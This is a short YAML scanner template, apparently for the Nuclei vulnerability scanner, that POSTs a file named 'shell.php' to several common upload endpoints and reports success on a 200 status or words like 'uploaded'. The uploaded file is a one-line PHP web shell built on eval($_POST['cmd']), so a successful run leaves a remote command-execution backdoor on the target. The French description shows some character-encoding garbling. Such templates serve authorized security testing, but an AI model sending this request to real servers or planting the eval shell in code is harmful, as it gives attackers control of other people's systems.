id: php-shell-upload

info:
  name: PHP Shell Upload Test
  author: nuclei-templates
  severity: critical
  description: Teste l'upload de shells PHP (c99, r57, etc.) - tr√®s dangereux
  tags: php-shell,webshell,upload,obsolete,security

http:
  - method: POST
    path:
      - "{{BaseURL}}/upload.php"
      - "{{BaseURL}}/filemanager/upload.php"
      - "{{BaseURL}}/admin/upload.php"

    headers:
      Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

    body: |
      ------WebKitFormBoundary
      Content-Disposition: form-data; name="file"; filename="shell.php"
      Content-Type: application/x-php

      <?php eval($_POST['cmd']); ?>
      ------WebKitFormBoundary--

    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "uploaded"
          - "success"
          - ".php"
        condition: or

